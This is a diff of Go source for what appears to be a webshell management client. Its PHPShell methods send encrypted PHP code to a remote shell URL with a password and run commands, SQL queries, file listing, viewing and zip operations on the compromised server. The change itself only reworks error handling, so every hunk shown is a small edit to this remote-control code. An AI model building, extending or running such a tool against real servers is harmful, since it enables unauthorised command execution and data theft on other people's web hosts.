@@ -28,13 +28,19 @@ func (s *PHPShell) FreshSession(id int, url string, password string) (string, er
 	// 加密code
 	enCode := util.Encrypt(string(code), password)
 
-	PhpSessions[id], _ = util.PostRequestWithoutSession(url, password, enCode)
+	PhpSessions[id], err = util.PostRequestWithoutSession(url, password, enCode)
+	if err != nil {
+		return "", err
+	}
+
 	session := PhpSessions[id] // if key not exist, it returns "" , bcz type is string
 	log.Println("当前PHPSESSID " + session)
+
 	enResult, err := util.PostRequest(url, password, enCode, session)
 	if err != nil {
-		return "HookPost error", err
+		return "", err
 	}
+
 	// 解密code
 	res := util.Decrypt(enResult, password)
 
@@ -52,7 +58,7 @@ func (s *PHPShell) BaseInfo(id int, url string, password string) (string, error)
 
 	res, err := util.HookPost(url, password, string(code), PhpSessions[id])
 	if err != nil {
-		return "HookPost error", err
+		return "", err
 	}
 
 	return res, nil
@@ -71,7 +77,7 @@ func (s *PHPShell) ExecCommand(id int, command string, url string, password stri
 
 	osType, err := util.HookPost(url, password, string(code), PhpSessions[id])
 	if err != nil {
-		return "HookPost error", err
+		return "", err
 	}
 
 	// 2. base on the osType, execute the command
@@ -89,7 +95,7 @@ func (s *PHPShell) ExecCommand(id int, command string, url string, password stri
 
 	res, err := util.HookPost(url, password, string(code), PhpSessions[id])
 	if err != nil {
-		return "HookPost error", err
+		return "", err
 	}
 
 	return res, nil
@@ -116,7 +122,7 @@ function encrypt($data, $key) {
 }`, code)
 	res, err := util.HookPost(url, password, shellcode, PhpSessions[id])
 	if err != nil {
-		return "HookPost error", err
+		return "", err
 	}
 	return res, nil
 }
@@ -139,7 +145,7 @@ func (s *PHPShell) ExecSql(id int, driver, host, port, user, pass, database, sql
 
 	res, err := util.HookPost(url, password, string(code), PhpSessions[id])
 	if err != nil {
-		return "HookPost error", err
+		return "", err
 	}
 	return res, nil
 
@@ -153,7 +159,7 @@ func (s *PHPShell) FileZip(id int, srcPath string, toPath string, url string, pa
 	code = fmt.Appendf(code, "\nmain(\"%s\", \"%s\");", srcPath, toPath)
 	res, err := util.HookPost(url, password, string(code), PhpSessions[id])
 	if err != nil {
-		return "HookPost error", err
+		return "", err
 	}
 	return res, nil
 }
@@ -166,7 +172,7 @@ func (s *PHPShell) FileUnZip(id int, srcPath string, toPath string, url string, 
 	code = fmt.Appendf(code, "\nmain(\"%s\", \"%s\");", srcPath, toPath)
 	res, err := util.HookPost(url, password, string(code), PhpSessions[id])
 	if err != nil {
-		return "HookPost error", err
+		return "", err
 	}
 	return res, nil
 }
@@ -181,7 +187,7 @@ func (s *PHPShell) FileList(id int, path string, url string, password string) (s
 
 	res, err := util.HookPost(url, password, string(code), PhpSessions[id])
 	if err != nil {
-		return "HookPost error", err
+		return "", err
 	}
 	return res, nil
 }
@@ -195,7 +201,7 @@ func (s *PHPShell) FileShow(id int, path string, url string, password string) (s
 
 	res, err := util.HookPost(url, password, string(code), PhpSessions[id])
 	if err != nil {
-		return "HookPost error", err
+		return "", err
 	}
 	return res, nil
 }
